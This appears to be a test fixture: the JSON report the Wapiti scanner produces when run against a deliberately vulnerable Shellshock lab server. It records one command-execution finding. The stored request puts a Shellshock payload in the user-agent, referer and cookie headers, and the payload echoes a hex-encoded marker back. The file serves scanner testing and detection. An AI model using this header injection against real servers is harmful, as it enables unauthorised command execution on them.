@@ -1,0 +1,217 @@
+{
+    "vulnerabilities": {
+        "Backup file": [],
+        "Weak credentials": [],
+        "CRLF Injection": [],
+        "Content Security Policy Configuration": [],
+        "Cross Site Request Forgery": [],
+        "Potentially dangerous file": [],
+        "Command execution": [
+            {
+                "method": "GET",
+                "path": "/cgi-bin/vuln.cgi",
+                "info": "URL http://shellshock/cgi-bin/vuln.cgi seems vulnerable to Shellshock attack",
+                "level": 3,
+                "parameter": "",
+                "referer": "",
+                "module": "shellshock",
+                "http_request": "GET /cgi-bin/vuln.cgi HTTP/1.1\nhost: shellshock\nconnection: keep-alive\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nuser-agent: () { :;}; echo; echo; echo -e '\\x62\\x45\\x37\\x46\\x64\\x38\\x65\\x32\\x36\\x37\\x62\\x61\\x37\\x30\\x62\\x66\\x65\\x65\\x33\\x32\\x33\\x45\\x64\\x46\\x62\\x34\\x61\\x33\\x35\\x61\\x63\\x65';\nreferer: () { :;}; echo; echo; echo -e '\\x62\\x45\\x37\\x46\\x64\\x38\\x65\\x32\\x36\\x37\\x62\\x61\\x37\\x30\\x62\\x66\\x65\\x65\\x33\\x32\\x33\\x45\\x64\\x46\\x62\\x34\\x61\\x33\\x35\\x61\\x63\\x65';\ncookie: () { :;}; echo; echo; echo -e '\\x62\\x45\\x37\\x46\\x64\\x38\\x65\\x32\\x36\\x37\\x62\\x61\\x37\\x30\\x62\\x66\\x65\\x65\\x33\\x32\\x33\\x45\\x64\\x46\\x62\\x34\\x61\\x33\\x35\\x61\\x63\\x65';",
+                "curl_command": "curl \"http://shellshock/cgi-bin/vuln.cgi\"",
+                "wstg": [
+                    "WSTG-INPV-12"
+                ],
+                "detail": {
+                    "response": {
+                        "status_code": 200,
+                        "body": "\nbE7Fd8e267ba70bfee323EdFb4a35ace\n\n\nbE7Fd8e267ba70bfee323EdFb4a35ace\n\n\nbE7Fd8e267ba70bfee323EdFb4a35ace\nContent-type: text/html\n\n",
+                        "headers": [
+                            [
+                                "server",
+                                "Apache/2.4.57 (Unix)"
+                            ],
+                            [
+                                "keep-alive",
+                                "timeout=5, max=99"
+                            ],
+                            [
+                                "connection",
+                                "Keep-Alive"
+                            ],
+                            [
+                                "transfer-encoding",
+                                "chunked"
+                            ],
+                            [
+                                "content-length",
+                                "129"
+                            ]
+                        ]
+                    }
+                }
+            }
+        ],
+        "Path Traversal": [],
+        "Fingerprint web application framework": [],
+        "Fingerprint web server": [],
+        "Htaccess Bypass": [],
+        "HTTP Secure Headers": [],
+        "HttpOnly Flag cookie": [],
+        "Log4Shell": [],
+        "Open Redirect": [],
+        "Reflected Cross Site Scripting": [],
+        "Secure Flag cookie": [],
+        "SQL Injection": [],
+        "TLS/SSL misconfigurations": [],
+        "Server Side Request Forgery": [],
+        "Stored Cross Site Scripting": [],
+        "Subdomain takeover": [],
+        "Blind SQL Injection": [],
+        "XML External Entity": []
+    },
+    "anomalies": {
+        "Internal Server Error": [],
+        "Resource consumption": []
+    },
+    "additionals": {
+        "Fingerprint web technology": [],
+        "HTTP Methods": []
+    },
+    "infos": {
+        "target": "http://shellshock/",
+        "version": "Wapiti 3.1.7",
+        "scope": "folder",
+        "auth": null,
+        "crawled_pages_nbr": 2,
+        "crawled_pages": [
+            {
+                "request": {
+                    "url": "http://shellshock/",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "host",
+                            "shellshock"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ]
+                    ],
+                    "referer": "",
+                    "enctype": "",
+                    "encoding": "UTF-8",
+                    "depth": 0
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<html>\n\n<head>\n    <title>Vulnerables | ShellShock</title>\n</head>\n\n<body>\n    <h1>This website is vulnerable to ShellShock, please exploit it</h1>\n    <pre>The script is <a href=\"/cgi-bin/vuln.cgi\"></a>here</pre>\n</body>\n\n</html>",
+                    "headers": [
+                        [
+                            "server",
+                            "Apache/2.4.57 (Unix)"
+                        ],
+                        [
+                            "accept-ranges",
+                            "bytes"
+                        ],
+                        [
+                            "content-length",
+                            "230"
+                        ],
+                        [
+                            "keep-alive",
+                            "timeout=5, max=100"
+                        ],
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-type",
+                            "text/html"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://shellshock/cgi-bin/vuln.cgi",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "host",
+                            "shellshock"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ]
+                    ],
+                    "referer": "",
+                    "enctype": "",
+                    "encoding": "UTF-8",
+                    "depth": 1
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "",
+                    "headers": [
+                        [
+                            "server",
+                            "Apache/2.4.57 (Unix)"
+                        ],
+                        [
+                            "keep-alive",
+                            "timeout=5, max=99"
+                        ],
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "transfer-encoding",
+                            "chunked"
+                        ],
+                        [
+                            "content-type",
+                            "text/html"
+                        ]
+                    ]
+                }
+            }
+        ],
+        "detailed_report": true
+    }
+}
